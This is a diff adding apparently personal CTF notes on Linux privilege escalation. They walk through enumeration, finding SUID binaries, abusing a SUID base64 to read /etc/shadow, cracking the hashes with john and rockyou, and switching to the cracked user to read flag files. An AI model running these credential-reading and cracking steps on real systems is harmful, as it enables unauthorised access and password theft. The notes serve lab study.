@@ -1,0 +1,54 @@
+Step 1:
+    ->whoami
+    ->id
+    ->pwd
+
+    ->refer to the /Linux_Priviledge_Escalation/ Enumeration.txt to TEST different LNX Commands
+        in order to find Escalation possibilities
+
+    OR
+    ->refer to /Linux_Priviledge_Escalation/ Automated_Enumeration_Tools.txt
+
+Step 2:
+    if some "sudo" or "SUID" exploit:
+        ->refert to https://gtfobins.github.io/gtfobins
+
+    in case of bin/base64:
+        ->find the flag or the file we want to read by passing "root" priv:
+
+            find the right directory cmd + avoid the see the errors:
+            $find / -name <file name> -type f 2>/dev/null
+
+            If OK:
+
+            LFILE=file path
+            /usr/bin/base64 "$LFILE" | base64 --decode
+
+        OR use LFILE to escalade privilege to get the Password HASH:
+
+            Find if Possible to cat etc/passwd:
+            find / -type f -perm -04000 -ls 2>/dev/null
+                if ok:
+                    cat etc/passwd:
+
+            Then (use the base64 SUID):
+                LFILE=/etc/shadow
+                /usr/bin/base64 "$LFILE" | base64 --decode
+
+            
+            ->Copy theses 2 files on our Attack Machine Kali:
+                unshadow passwd.txt shadow.txt > john-input
+
+                cat john-input
+                john john-input --wordlist=/usr/share/wordlists/rockyou.txt
+
+            if Password has been discovered:
+                su <username>
+                password
+            
+            To find another flag or else with the same SUID (base64):
+                From the new cracked user priviledge - eg:
+                    LFILE=/home/rootflag/flag2.txt
+                    /usr/bin/base64 "$LFILE" | base64 --decode
+
+
